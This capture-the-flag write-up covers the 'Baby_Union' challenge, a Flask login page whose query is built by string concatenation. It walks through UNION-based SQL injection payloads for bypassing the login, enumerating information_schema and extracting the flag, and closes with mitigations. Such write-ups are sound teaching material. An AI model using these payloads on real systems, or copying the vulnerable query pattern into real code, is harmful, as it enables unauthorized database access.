# 👶 Baby_Union

## Challenge Overview

**Description**: A web service that displays account information upon login. Exploit SQL injection to retrieve the flag. Note that table and column names in the provided `init.sql` differ from actual names.

**Flag Format**: `DH{...}`

---

## Source Code Analysis

### Flask Application
```python
import os
from flask import Flask, request, render_template
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'secret_db')
mysql = MySQL(app)

@app.route("/", methods = ["GET", "POST"])
def index():
    if request.method == "POST":
        uid = request.form.get('uid', '')
        upw = request.form.get('upw', '')
        if uid and upw:
            cur = mysql.connection.cursor()
            cur.execute(f"SELECT * FROM users WHERE uid='{uid}' and upw='{upw}';")
            data = cur.fetchall()
            if data:
                return render_template("user.html", data=data)
            else: 
                return render_template("index.html", data="Wrong!")
        return render_template("index.html", data="Fill the input box", pre=1)
    return render_template("index.html")
```

### Database Schema
```sql
CREATE DATABASE secret_db;
GRANT ALL PRIVILEGES ON secret_db.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `secret_db`;
CREATE TABLE users (
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null,
  descr varchar(128) not null
);

INSERT INTO users (uid, upw, descr) values ('admin', 'apple', 'For admin');
INSERT INTO users (uid, upw, descr) values ('guest', 'melon', 'For guest');
INSERT INTO users (uid, upw, descr) values ('banana', 'test', 'For banana');

CREATE TABLE fake_table_name (
  idx int auto_increment primary key,
  fake_col1 varchar(128) not null,
  fake_col2 varchar(128) not null,
  fake_col3 varchar(128) not null,
  fake_col4 varchar(128) not null
);

INSERT INTO fake_table_name (fake_col1, fake_col2, fake_col3, fake_col4) 
values ('flag is ', 'DH{sam','ple','flag}');
```

### Template Analysis (user.html)
```html
<h2>Hello {{ data[0][1] }}</h2>
<table>
  {% for i in data %}
  <tr>
    <th scope="row">{{ i[0] }}</th>
    <td>{{ i[1] }}</td>
    <td>{{ i[3] }}</td>
  </tr>
  {% endfor %}
</table>
```

**Key Observation**: Template displays columns at indices `[0]`, `[1]`, and `[3]`

---

## Vulnerability Analysis

### SQL Injection Point
The vulnerable query in the application:
```sql
SELECT * FROM users WHERE uid='{uid}' and upw='{upw}';
```

User input is directly concatenated without sanitization, allowing SQL injection.

---

## Exploitation Steps

### Step 1: Confirm SQL Injection
**Payload**:
```
uid: admin'#
upw: anything
```

**Resulting Query**:
```sql
SELECT * FROM users WHERE uid='admin'#' and upw='anything';
```

**Result**: Successfully logs in as admin, confirming SQL injection vulnerability.

### Step 2: Database Fingerprinting
**Payload**:
```
admin' union select version(),null,null,null #
```

**Result**: Reveals MariaDB version, confirming we can use `information_schema`.

### Step 3: Table Enumeration
**Payload**:
```
' union select table_name, null, null, null from information_schema.tables#
```

**Result**: Discovers suspicious table named `onlyflag`.

### Step 4: Column Enumeration
**Payload**:
```
' union select column_name, null, null, null from information_schema.columns where table_name='onlyflag' #
```

**Result**: Reveals columns: `sname`, `svalue`, `sflag`, `sclose`

### Step 5: Flag Extraction
**Initial Attempt**:
```
' union select sname, svalue, sflag, sclose from onlyflag #
```

**Issue**: Flag appears truncated due to template display logic.

**Final Payload** (optimized for template indices):
```
' union select svalue, sflag, null, sclose from onlyflag #
```

**Result**: Successfully retrieves complete flag: `DH{sample_flag}`

---

## Key Technical Points

### UNION SQL Injection Requirements
- Column count must match between original and injected queries
- `users` table has 4 columns: `idx`, `uid`, `upw`, `descr`
- Must use 4 columns in UNION SELECT

### Template Display Logic
- Template only displays columns at positions `[0]`, `[1]`, `[3]`
- Strategic column placement required for complete flag extraction

### Database-Specific Features
- **MariaDB/MySQL**: Supports `information_schema`
- **Note**: Oracle and SQLite don't support this approach
- Version fingerprinting crucial for payload selection

---

## Final Flag
```
DH{sample_flag}
```

---

## Lessons Learned

1. **Always fingerprint the database** - Different databases require different injection techniques
2. **Understand output formatting** - Template logic affects how data is displayed
3. **Column alignment matters** - UNION requires matching column counts
4. **Information schema is powerful** - Provides comprehensive database metadata
5. **Test incrementally** - Build payload complexity step by step

## Mitigation
- Use parameterized queries/prepared statements
- Input validation and sanitization
- Principle of least privilege for database accounts
- Web Application Firewall (WAF) implementation
